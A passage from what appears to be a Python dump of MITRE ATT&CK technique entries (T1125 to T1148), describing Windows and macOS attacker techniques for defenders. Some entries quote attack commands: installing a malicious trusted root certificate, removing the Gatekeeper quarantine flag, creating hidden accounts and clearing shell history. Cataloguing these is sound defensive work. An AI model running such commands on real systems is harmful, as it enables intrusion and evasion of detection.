           'description': "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or "
                          'webcams) or applications (e.g., video call services) to capture video recordings for the '
                          'purpose of gathering information. Images may also be captured from devices or applications, '
                          'potentially in specified intervals, in lieu of video files.\n'
                          '\n'
                          'Malware or scripts may be used to interact with the devices through an available API '
                          'provided by the operating system or an application to capture video or images. Video or '
                          'image files may be written to disk and exfiltrated later. This technique differs from '
                          '[Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices '
                          "or applications for video recording rather than capturing the victim's screen.\n"
                          '\n'
                          "In macOS, there are a few different malware samples that record the user's webcam such as "
                          'FruitFly and Proton. (Citation: objective-see 2017 review)',
           'name': 'Video Capture',
           'platforms': ['Windows', 'macOS']},
 'T1126': {'attack_id': 'T1126',
           'categories': ['defense-evasion'],
           'description': 'Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) '
                          'connections can be removed when no longer needed. '
                          '[Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to '
                          'remove network share connections with the <code>net use \\\\system\\share /delete</code> '
                          'command. (Citation: Technet Net Use)\n'
                          '\n'
                          'Adversaries may remove share connections that are no longer useful in order to clean up '
                          'traces of their operation.',
           'name': 'Network Share Connection Removal',
           'platforms': ['Windows']},
 'T1127': {'attack_id': 'T1127',
           'categories': ['defense-evasion', 'execution'],
           'description': 'There are many utilities used for software development related tasks that can be used to '
                          'execute code in various forms to assist in development, debugging, and reverse engineering. '
                          'These utilities may often be signed with legitimate certificates that allow them to execute '
                          'on a system and proxy execution of malicious code through a trusted process that '
                          'effectively bypasses application whitelisting defensive solutions.\n'
                          '\n'
                          '### MSBuild\n'
                          '\n'
                          'MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It '
                          'takes XML formatted project files that define requirements for building various platforms '
                          'and configurations. (Citation: MSDN MSBuild) \n'
                          '\n'
                          'Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. '
                          'The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# '
                          'code to be inserted into the XML project file. (Citation: MSDN MSBuild) Inline Tasks '
                          'MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, '
                          'so when it is used this way it can execute arbitrary code and bypass application '
                          'whitelisting defenses that are configured to allow MSBuild.exe execution. (Citation: SubTee '
                          'GitHub All The Things Application Whitelisting Bypass)\n'
                          '\n'
                          '### DNX\n'
                          '\n'
                          'The .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with '
                          'Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: '
                          'Microsoft Migrating from DNX) DNX is not present on standard builds of Windows and may only '
                          'be present on developer workstations using older versions of .NET Core and ASP.NET Core '
                          '1.0. The dnx.exe executable is signed by Microsoft. \n'
                          '\n'
                          'An adversary can use dnx.exe to proxy execution of arbitrary code to bypass application '
                          'whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)\n'
                          '\n'
                          '### RCSI\n'
                          '\n'
                          'The rcsi.exe utility is a non-interactive command-line interface for C# that is similar to '
                          'csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but '
                          'has since been deprecated for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) '
                          'The rcsi.exe binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)\n'
                          '\n'
                          'C# .csx script files can be written and executed with rcsi.exe at the command-line. An '
                          'adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application '
                          'whitelisting policies that do not account for execution of rcsi.exe. (Citation: engima0x3 '
                          'RCSI Bypass)\n'
                          '\n'
                          '### WinDbg/CDB\n'
                          '\n'
                          'WinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console '
                          'Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows '
                          'software development kits and can be used as standalone tools. (Citation: Microsoft '
                          'Debugging Tools for Windows) They are commonly used in software development and reverse '
                          'engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe '
                          'binaries are signed by Microsoft.\n'
                          '\n'
                          'An adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass '
                          'application whitelist policies that do not account for execution of those utilities. '
                          '(Citation: Exploit Monday WinDbg)\n'
                          '\n'
                          'It is likely possible to use other debuggers for similar purposes, such as the kernel-mode '
                          'debugger kd.exe, which is also signed by Microsoft.\n'
                          '\n'
                          '### Tracker\n'
                          '\n'
                          'The file tracker utility, tracker.exe, is included with the .NET framework as part of '
                          'MSBuild. It is used for logging calls to the Windows file system. (Citation: Microsoft Docs '
                          'File Tracking)\n'
                          '\n'
                          'An adversary can use tracker.exe to proxy execution of an arbitrary DLL into another '
                          'process. Since tracker.exe is also signed it can be used to bypass application whitelisting '
                          'solutions. (Citation: Twitter SubTee Tracker.exe)',
           'name': 'Trusted Developer Utilities',
           'platforms': ['Windows']},
 'T1128': {'attack_id': 'T1128',
           'categories': ['persistence'],
           'description': 'Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to '
                          'interact with the network configuration of a system. It contains functionality to add '
                          'helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths '
                          'to registered netsh.exe helper DLLs are entered into the Windows Registry at '
                          '<code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n'
                          '\n'
                          'Adversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a '
                          'persistent manner when netsh.exe is executed automatically with another Persistence '
                          'technique or if other persistent software is present on the system that executes netsh.exe '
                          'as part of its normal functionality. Examples include some VPN software that invoke '
                          'netsh.exe. (Citation: Demaske Netsh Persistence)\n'
                          '\n'
                          "Proof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. "
                          '(Citation: Github Netsh Helper CS Beacon)',
           'name': 'Netsh Helper DLL',
           'platforms': ['Windows']},
 'T1129': {'attack_id': 'T1129',
           'categories': ['execution'],
           'description': 'The Windows module loader can be instructed to load DLLs from arbitrary local paths and '
                          'arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in '
                          'NTDLL.dll and is part of the Windows Native API which is called from functions like '
                          'CreateProcess(), LoadLibrary(), etc. of the Win32 API. (Citation: Wikipedia Windows Library '
                          'Files)\n'
                          '\n'
                          'The module loader can load DLLs:\n'
                          '\n'
                          '* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT '
                          'directory;\n'
                          '    \n'
                          '* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) '
                          'pathname (but without extension);\n'
                          '    \n'
                          '* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative '
                          'pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded '
                          'EXPORTs;\n'
                          '    \n'
                          '* via <code>&#x3c;file name="filename.extension" loadFrom="fully-qualified or relative '
                          'pathname"&#x3e;</code> in an embedded or external "application manifest". The file name '
                          'refers to an entry in the IMPORT directory or a forwarded EXPORT.\n'
                          '\n'
                          'Adversaries can use this functionality as a way to execute arbitrary code on a system.',
           'name': 'Execution through Module Load',
           'platforms': ['Windows']},
 'T1130': {'attack_id': 'T1130',
           'categories': ['defense-evasion'],
           'description': 'Root certificates are used in public key cryptography to identify a root certificate '
                          'authority (CA). When a root certificate is installed, the system or application will trust '
                          "certificates in the root's chain of trust that have been signed by the root certificate. "
                          '(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing '
                          'secure TLS/SSL communications within a web browser. When a user attempts to browse a '
                          'website that presents a certificate that is not trusted an error message will be displayed '
                          'to warn the user of the security risk. Depending on the security settings, the browser may '
                          'not allow the user to establish a connection to the website.\n'
                          '\n'
                          'Installation of a root certificate on a compromised system would give an adversary a way to '
                          'degrade the security of that system. Adversaries have used this technique to avoid security '
                          'warnings prompting users when compromised systems connect over HTTPS to adversary '
                          'controlled web servers that spoof legitimate websites in order to collect login '
                          'credentials. (Citation: Operation Emmental)\n'
                          '\n'
                          'Atypical root certificates have also been pre-installed on systems by the manufacturer or '
                          'in the software supply chain and were used in conjunction with malware/adware to provide a '
                          'man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL '
                          'communications. (Citation: Kaspersky Superfish)\n'
                          '\n'
                          'Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned '
                          'certificate chains will carry many of the same metadata characteristics of the source and '
                          'can be used to sign malicious code that may then bypass signature validation tools (ex: '
                          'Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of '
                          'Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n'
                          '\n'
                          'In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot '
                          '-k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious '
                          'certificate as a trusted root certificate into the system keychain. (Citation: '
                          'objective-see ay mami 2018)',
           'name': 'Install Root Certificate',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1131': {'attack_id': 'T1131',
           'categories': ['persistence'],
           'description': 'Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) '
                          'process at system start. They provide support for multiple logon processes and multiple '
                          'security protocols to the operating system. (Citation: MSDN Authentication Packages)\n'
                          '\n'
                          'Adversaries can use the autostart mechanism provided by LSA Authentication Packages for '
                          'persistence by placing a reference to a binary in the Windows Registry location '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of '
                          '<code>"Authentication Packages"=<target binary></code>. The binary will then be executed by '
                          'the system when the authentication packages are loaded.',
           'name': 'Authentication Package',
           'platforms': ['Windows']},
 'T1132': {'attack_id': 'T1132',
           'categories': ['command-and-control'],
           'description': 'Command and control (C2) information is encoded using a standard data encoding system. Use '
                          'of data encoding may be to adhere to existing protocol specifications and includes use of '
                          'ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding '
                          'systems. (Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character '
                          'Encoding) Some data encoding systems may also result in data compression, such as gzip.',
           'name': 'Data Encoding',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1133': {'attack_id': 'T1133',
           'categories': ['persistence', 'initial-access'],
           'description': 'Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to '
                          'internal enterprise network resources from external locations. There are often remote '
                          'service gateways that manage connections and credential authentication for these services. '
                          'Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1028) can '
                          'also be used externally.\n'
                          '\n'
                          'Adversaries may use remote services to initially access and/or persist within a network. '
                          '(Citation: Volexity Virtual Private Keylogging) Access to [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a '
                          'requirement, which could be obtained through credential pharming or by obtaining the '
                          'credentials from users after compromising the enterprise network. Access to remote services '
                          'may be used as part of [Redundant Access](https://attack.mitre.org/techniques/T1108) during '
                          'an operation.',
           'name': 'External Remote Services',
           'platforms': ['Windows']},
 'T1134': {'attack_id': 'T1134',
           'categories': ['defense-evasion', 'privilege-escalation'],
           'description': 'Windows uses access tokens to determine the ownership of a running process. A user can '
                          'manipulate access tokens to make a running process appear as though it belongs to someone '
                          'other than the user that started the process. When this occurs, the process also takes on '
                          'the security context associated with the new token. For example, Microsoft promotes the use '
                          'of access tokens as a security best practice. Administrators should log in as a standard '
                          'user but run their tools with administrator privileges using the built-in access token '
                          'manipulation command <code>runas</code>. (Citation: Microsoft runas)\n'
                          '  \n'
                          'Adversaries may use access tokens to operate under a different user or system security '
                          'context to perform actions and evade detection. An adversary can use built-in Windows API '
                          'functions to copy access tokens from existing processes; this is known as token stealing. '
                          'An adversary must already be in a privileged user context (i.e. administrator) to steal a '
                          'token. However, adversaries commonly use token stealing to elevate their security context '
                          'from the administrator level to the SYSTEM level. An adversary can use a token to '
                          'authenticate to a remote system as the account for that token if the account has '
                          'appropriate permissions on the remote system. (Citation: Pentestlab Token Manipulation)\n'
                          '\n'
                          'Access tokens can be leveraged by adversaries through three methods: (Citation: BlackHat '
                          'Atkinson Winchester Token Manipulation)\n'
                          '\n'
                          '**Token Impersonation/Theft** - An adversary creates a new access token that duplicates an '
                          'existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with '
                          '<code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on '
                          "user's security context, or with <code>SetThreadToken</code> to assign the impersonated "
                          'token to a thread. This is useful for when the target user has a non-network logon session '
                          'on the system.\n'
                          '\n'
                          '**Create Process with a Token** - An adversary creates a new access token with '
                          '<code>DuplicateToken(Ex)</code> and uses it with <code>CreateProcessWithTokenW</code> to '
                          'create a new process running under the security context of the impersonated user. This is '
                          'useful for creating a new process under the security context of a different user.\n'
                          '\n'
                          '**Make and Impersonate Token** - An adversary has a username and password but the user is '
                          'not logged onto the system. The adversary can then create a logon session for the user '
                          'using the <code>LogonUser</code> function. The function will return a copy of the new '
                          "session's access token and the adversary can use <code>SetThreadToken</code> to assign the "
                          'token to a thread.\n'
                          '\n'
                          'Any standard user can use the <code>runas</code> command, and the Windows API functions, to '
                          'create impersonation tokens; it does not require access to an administrator account.\n'
                          '\n'
                          'Metasploit’s Meterpreter payload allows arbitrary token manipulation and uses token '
                          'impersonation to escalate privileges. (Citation: Metasploit access token)  The Cobalt '
                          'Strike beacon payload allows arbitrary token impersonation and can also create tokens. '
                          '(Citation: Cobalt Strike Access Token)',
           'name': 'Access Token Manipulation',
           'platforms': ['Windows']},
 'T1135': {'attack_id': 'T1135',
           'categories': ['discovery'],
           'description': 'Networks often contain shared network drives and folders that enable users to access file '
                          'directories on various systems across a network. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia '
                          'Shared Resource) (Citation: TechNet Shared Folder)\n'
                          '\n'
                          '[Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for '
                          'available shared drives using the <code>net view \\\\remotesystem</code> command. It can '
                          'also be used to query shared drives on the local system using <code>net share</code>.\n'
                          '\n'
                          'Adversaries may look for folders and drives shared on remote systems as a means of '
                          'identifying sources of information to gather as a precursor for Collection and to identify '
                          'potential systems of interest for Lateral Movement.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, locally mounted shares can be viewed with the <code>df -aH</code> command.',
           'name': 'Network Share Discovery',
           'platforms': ['macOS', 'Windows']},
 'T1136': {'attack_id': 'T1136',
           'categories': ['persistence'],
           'description': 'Adversaries with a sufficient level of access may create a local system or domain account. '
                          'Such accounts may be used for persistence that do not require persistent remote access '
                          'tools to be deployed on the system.\n'
                          '\n'
                          'The <code>net user</code> commands can be used to create a local or domain account.',
           'name': 'Create Account',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1137': {'attack_id': 'T1137',
           'categories': ['persistence'],
           'description': 'Microsoft Office is a fairly common application suite on Windows-based operating systems '
                          'within an enterprise network. There are multiple mechanisms that can be used with Office '
                          'for persistence when an Office-based application is started.\n'
                          '\n'
                          '### Office Template Macros\n'
                          '\n'
                          'Microsoft Office contains templates that are part of common Office applications and are '
                          'used to customize styles. The base templates within the application are used each time an '
                          'application starts. (Citation: Microsoft Change Normal Template)\n'
                          '\n'
                          'Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can '
                          'inserted into the base templated and used to execute code when the respective Office '
                          'application starts in order to obtain persistence. Examples for both Word and Excel have '
                          'been discovered and published. By default, Word has a Normal.dotm template created that can '
                          'be modified to include a malicious macro. Excel does not have a template file created by '
                          'default, but one can be added that will automatically be loaded. (Citation: enigma0x3 '
                          'normal.dotm) (Citation: Hexacorn Office Template Macros)\n'
                          '\n'
                          'Word Normal.dotm '
                          'location:<code>C:\\Users\\(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n'
                          '\n'
                          'Excel Personal.xlsb '
                          'location:<code>C:\\Users\\(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n'
                          '\n'
                          'An adversary may need to enable macros to execute unrestricted depending on the system or '
                          'enterprise security policy on use of macros.\n'
                          '\n'
                          '### Office Test\n'
                          '\n'
                          'A Registry location was found that when a DLL reference was placed within it the '
                          'corresponding DLL pointed to by the binary path would be executed every time an Office '
                          'application is started (Citation: Hexacorn Office Test)\n'
                          '\n'
                          '<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n'
                          '\n'
                          '### Add-ins\n'
                          '\n'
                          'Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft '
                          'Office Add-ins)\n'
                          '\n'
                          'Add-ins can also be used to obtain persistence because they can be set to execute code when '
                          'an Office application starts. There are different types of add-ins that can be used by the '
                          'various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, '
                          'Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual '
                          'Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office '
                          'Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n'
                          '\n'
                          '### Outlook Rules, Forms, and Home Page\n'
                          '\n'
                          'A variety of features have been discovered in Outlook that can be abused to obtain '
                          'persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler '
                          'GitHub) \n'
                          '\n'
                          'Outlook rules allow a user to define automated behavior to manage email messages. A benign '
                          'rule might, for example, automatically move an email to a particular folder in Outlook if '
                          'it contains specific words from a specific sender. Malicious Outlook rules can be created '
                          'that can trigger code execution when an adversary sends a specifically crafted email to '
                          'that user.(Citation: SilentBreak Outlook Rules)\n'
                          '\n'
                          'Outlook forms are used as templates for presentation and functionality in Outlook messages. '
                          'Custom Outlook Forms can be created that will execute code when a specifically crafted '
                          'email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost '
                          'Outlook Forms)\n'
                          '\n'
                          'Outlook Home Page is a legacy feature used to customize the presentation of Outlook '
                          'folders. This feature allows for an internal or external URL to be loaded and presented '
                          'whenever a folder is opened. A malicious HTML page can be crafted that will execute code '
                          'when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n'
                          '\n'
                          'To abuse these features, an adversary requires prior access to the user’s Outlook mailbox, '
                          'either via an Exchange/OWA server or via the client application. Once malicious rules, '
                          'forms, or Home Pages have been added to the user’s mailbox, they will be loaded when '
                          'Outlook is started. Malicious Home Pages will execute when the right Outlook folder is '
                          'loaded/reloaded while malicious rules and forms will execute when an adversary sends a '
                          'specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)(Citation: '
                          'SensePost Outlook Forms)(Citation: SensePost Outlook Home Page)',
           'name': 'Office Application Startup',
           'platforms': ['Windows']},
 'T1138': {'attack_id': 'T1138',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) '
                          'was created to allow for backward compatibility of software as the operating system '
                          'codebase changes over time. For example, the application shimming feature allows developers '
                          'to apply fixes to applications (without rewriting code) that were created for Windows XP so '
                          'that it will work with Windows 10. (Citation: Endgame Process Injection July 2017) Within '
                          'the framework, shims are created to act as a buffer between the program (or more '
                          'specifically, the Import Address Table) and the Windows OS. When a program is executed, the '
                          'shim cache is referenced to determine if the program requires the use of the shim database '
                          '(.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179) '
                          'to redirect the code as necessary in order to communicate with the OS. \n'
                          '\n'
                          'A list of all shims currently installed by the default Windows installer (sdbinst.exe) is '
                          'kept in:\n'
                          '\n'
                          '* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>\n'
                          '* <code>hklm\\software\\microsoft\\windows '
                          'nt\\currentversion\\appcompatflags\\installedsdb</code>\n'
                          '\n'
                          'Custom databases are stored in:\n'
                          '\n'
                          '* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>\n'
                          '* <code>hklm\\software\\microsoft\\windows '
                          'nt\\currentversion\\appcompatflags\\custom</code>\n'
                          '\n'
                          'To keep shims secure, Windows designed them to run in user mode so they cannot modify the '
                          'kernel and you must have administrator privileges to install a shim. However, certain shims '
                          'can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) '
                          '(UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution '
                          'Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory '
                          'addresses (GetProcAddress). Similar to '
                          '[Hooking](https://attack.mitre.org/techniques/T1179), utilizing these shims may allow an '
                          'adversary to perform several malicious acts such as elevate privileges, install backdoors, '
                          'disable defenses like Windows Defender, etc.',
           'name': 'Application Shimming',
           'platforms': ['Windows']},
 'T1139': {'attack_id': 'T1139',
           'categories': ['credential-access'],
           'description': 'Bash keeps track of the commands users type on the command-line with the "history" utility. '
                          'Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. '
                          'For each user, this file resides at the same location: <code>~/.bash_history</code>. '
                          'Typically, this file keeps track of the user’s last 500 commands. Users often type '
                          'usernames and passwords on the command-line as parameters to programs, which then get saved '
                          'to this file when they log out. Attackers can abuse this by looking through the file for '
                          'potential credentials. (Citation: External to DA, the OS X Way)',
           'name': 'Bash History',
           'platforms': ['Linux', 'macOS']},
 'T1140': {'attack_id': 'T1140',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may use [Obfuscated Files or '
                          'Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion '
                          'from analysis. They may require separate mechanisms to decode or deobfuscate that '
                          'information depending on how they intend to use it. Methods for doing that include built-in '
                          'functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on '
                          'the system.\n'
                          '\n'
                          'One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a '
                          'remote access tool portable executable file that has been hidden inside a certificate file. '
                          '(Citation: Malwarebytes Targeted Attack against Saudi Arabia)\n'
                          '\n'
                          'Another example is using the Windows <code>copy /b</code> command to reassemble binary '
                          'fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n'
                          '\n'
                          'Payloads may be compressed, archived, or encrypted in order to avoid detection.  These '
                          'payloads may be used with [Obfuscated Files or '
                          'Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to '
                          "mitigate detection. Sometimes a user's action may be required to open it for deobfuscation "
                          'or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The '
                          'user may also be required to input a password to open a password protected '
                          'compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke '
                          'November 2016) Adversaries may also used compressed or archived scripts, such as '
                          'Javascript.',
           'name': 'Deobfuscate/Decode Files or Information',
           'platforms': ['Windows']},
 'T1141': {'attack_id': 'T1141',
           'categories': ['credential-access'],
           'description': 'When programs are executed that need additional privileges than are present in the current '
                          'user context, it is common for the operating system to prompt the user for proper '
                          'credentials to authorize the elevated privileges for the task (ex: [Bypass User Account '
                          'Control](https://attack.mitre.org/techniques/T1088)).\n'
                          '\n'
                          'Adversaries may mimic this functionality to prompt users for credentials with a seemingly '
                          'legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer '
                          'requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits '
                          'MacKeeper) This type of prompt can be used to collect credentials via various languages '
                          'such as [AppleScript](https://attack.mitre.org/techniques/T1155)(Citation: LogRhythm Do You '
                          'Trust Oct 2014)(Citation: OSX Keydnap malware) and '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086)(Citation: LogRhythm Do You Trust '
                          'Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).',
           'name': 'Input Prompt',
           'platforms': ['macOS', 'Windows']},
 'T1142': {'attack_id': 'T1142',
           'categories': ['credential-access'],
           'description': "Keychains are the built-in way for macOS to keep track of users' passwords and credentials "
                          'for many services and features such as WiFi passwords, websites, secure notes, '
                          'certificates, and Kerberos. Keychain files are located in '
                          '<code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and '
                          '<code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The '
                          '<code>security</code> command-line utility, which is built into macOS by default, provides '
                          'a useful way to manage these credentials.\n'
                          '\n'
                          'To manage their credentials, users have to use additional credentials to access their '
                          'keychain. If an adversary knows the credentials for the login keychain, then they can get '
                          'access to all the other credentials stored in this vault. (Citation: External to DA, the OS '
                          'X Way) By default, the passphrase for the keychain is the user’s logon credentials.',
           'name': 'Keychain',
           'platforms': ['macOS']},
 'T1143': {'attack_id': 'T1143',
           'categories': ['defense-evasion'],
           'description': 'The configurations for how applications run on macOS and OS X are listed in property list '
                          '(plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, '
                          "which allows for Java applications to prevent the application's icon from appearing in the "
                          "Dock. A common use for this is when applications run in the system tray, but don't also "
                          'want to show up in the Dock. However, adversaries can abuse this feature and hide their '
                          'running window  (Citation: Antiquated Mac Malware).',
           'name': 'Hidden Window',
           'platforms': ['macOS']},
 'T1144': {'attack_id': 'T1144',
           'categories': ['defense-evasion'],
           'description': 'In macOS and OS X, when applications or programs are downloaded from the internet, there is '
                          'a special attribute set on the file called <code>com.apple.quarantine</code>. This '
                          "attribute is read by Apple's Gatekeeper defense program at execution time and provides a "
                          'prompt to the user to allow or deny execution. \n'
                          '\n'
                          'Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or '
                          'even from a drive shared over the local network won’t set this flag. Additionally, other '
                          'utilities or events like drive-by downloads don’t necessarily set it either. This '
                          'completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware '
                          'Persistence) The presence of the quarantine flag can be checked by the xattr command '
                          '<code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, '
                          'given sudo access or elevated permission, this attribute can be removed with xattr as well, '
                          '<code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing '
                          'quarantine attribute) (Citation: OceanLotus for OS X)\n'
                          ' \n'
                          'In typical operation, a file will be downloaded from the internet and given a quarantine '
                          'flag before being saved to disk. When the user tries to open the file or application, '
                          'macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then '
                          'macOS will then prompt the user to confirmation that they want to run the program and will '
                          'even provide the URL where the application came from. However, this is all based on the '
                          'file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)',
           'name': 'Gatekeeper Bypass',
           'platforms': ['macOS']},
 'T1145': {'attack_id': 'T1145',
           'categories': ['credential-access'],
           'description': 'Private cryptographic keys and certificates are used for authentication, '
                          'encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)\n'
                          '\n'
                          'Adversaries may gather private keys from compromised systems for use in authenticating to '
                          '[Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in '
                          'decrypting other collected files such as email. Common key and certificate file extensions '
                          'include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also '
                          'look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based '
                          'systems or <code>C:\\Users\\(username)\\.ssh\\</code> on Windows.\n'
                          '\n'
                          'Private keys should require a password or passphrase for operation, so an adversary may '
                          'also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or '
                          'attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase '
                          'off-line.\n'
                          '\n'
                          'Adversary tools have been discovered that search compromised systems for file extensions '
                          'relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: '
                          'Palo Alto Prince of Persia)',
           'name': 'Private Keys',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1146': {'attack_id': 'T1146',
           'categories': ['defense-evasion'],
           'description': 'macOS and Linux both keep track of the commands users type in their terminal so that users '
                          "can easily remember what they've done. These logs can be accessed in a few different ways. "
                          'While logged in, this command history is tracked in a file pointed to by the environment '
                          'variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed '
                          "to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of "
                          "this is that it allows users to go back to commands they've used before in different "
                          'sessions. Since everything typed on the command-line is saved, passwords passed in on the '
                          'command line are also saved. Adversaries can abuse this by searching these files for '
                          'cleartext passwords. Additionally, adversaries can use a variety of methods to prevent '
                          'their own commands from appear in these logs such as <code>unset HISTFILE</code>, '
                          '<code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm '
                          '~/.bash_history</code>.',
           'name': 'Clear Command History',
           'platforms': ['Linux', 'macOS']},
 'T1147': {'attack_id': 'T1147',
           'categories': ['defense-evasion'],
           'description': 'Every user account in macOS has a userID associated with it. When creating a user, you can '
                          'specify the userID for that account. There is a property value in '
                          '<code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> '
                          'that prevents users with userIDs 500 and lower from appearing at the login screen. By using '
                          'the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID '
                          'under 500 and enabling this property (setting it to Yes), an adversary can hide their user '
                          'accounts much more easily: <code>sudo dscl . -create /Users/username UniqueID 401</code> '
                          '(Citation: Cybereason OSX Pirrit).',
           'name': 'Hidden Users',
           'platforms': ['macOS']},
 'T1148': {'attack_id': 'T1148',
           'categories': ['defense-evasion'],
           'description': 'The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by '
                          'the <code>history</code> command and eventually into the <code>~/.bash_history</code> file '
                          'when a user logs out. This setting can be configured to ignore commands that start with a '
                          'space by simply setting it to "ignorespace". <code>HISTCONTROL</code> can also be set to '
                          'ignore duplicate commands by setting it to "ignoredups". In some Linux systems, this is set '
                          'by default to "ignoreboth" which covers both of the previous examples. This means that “ '
                          'ls” will not be saved, but “ls” would be saved by history. <code>HISTCONTROL</code> does '
                          'not exist by default on macOS, but can be set by the user and will be respected. '
                          'Adversaries can use this to operate without leaving traces by simply prepending a space to '
                          'all of their terminal commands.',
           'name': 'HISTCONTROL',
           'platforms': ['Linux', 'macOS']},
 'T1149': {'attack_id': 'T1149',
